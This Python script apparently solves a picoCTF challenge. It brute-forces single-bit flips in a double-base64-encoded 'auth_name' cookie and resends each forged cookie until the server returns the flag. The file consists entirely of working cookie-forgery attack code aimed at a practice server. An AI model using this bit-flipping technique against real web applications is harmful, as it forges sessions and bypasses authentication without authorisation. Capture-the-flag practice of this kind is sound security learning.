import requests
from base64 import b64decode, b64encode

ADDRESS = "http://mercury.picoctf.net:21553/"

s = requests.Session()
s.get(ADDRESS)
cookie = s.cookies["auth_name"]

cookieb64_1 = b64decode(cookie)
cookieb64_2 = b64decode(cookieb64_1)
byte_array = bytearray(cookieb64_2)

print(byte_array)

    
for i in range(0, 128):
    pos = i//8
    guessdec = cookieb64_2[0:pos] + ((cookieb64_2[pos]^(1<<(i%8))).to_bytes(1,'big'))+cookieb64_2[pos+1:]
    guessdec1 = b64encode(guessdec)
    guess = b64encode(b64encode(guessdec)).decode()
    response = requests.get(ADDRESS, cookies={'auth_name': guess})
    print(guessdec)
    if 'pico' in response.text:
        print(i)
        print(response.text)
        break
        


